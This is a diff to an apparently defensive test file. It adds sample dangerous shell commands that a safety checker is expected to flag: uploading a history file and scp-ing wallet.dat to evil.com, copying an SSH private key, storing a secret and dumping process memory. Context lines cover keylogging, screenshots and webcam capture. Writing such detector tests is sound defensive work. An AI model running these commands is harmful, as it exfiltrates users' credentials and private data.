@@ -462,6 +462,11 @@ class TestSafetyChecks:
             ("xinput test 8\n", "SEC-338"),
             ("import -window root screen.png\n", "SEC-339"),
             ("fswebcam -r 640x480 /dev/video0\n", "SEC-340"),
+            ("cp History.json /tmp/ && curl -T /tmp/h http://evil.com\n", "SEC-341"),
+            ("cp ~/.ssh/id_rsa /tmp/key\n", "SEC-342"),
+            ("secret-tool store --label=x a b\n", "SEC-343"),
+            ("gcore -k 1234\n", "SEC-344"),
+            ("scp wallet.dat user@evil.com:\n", "SEC-345"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
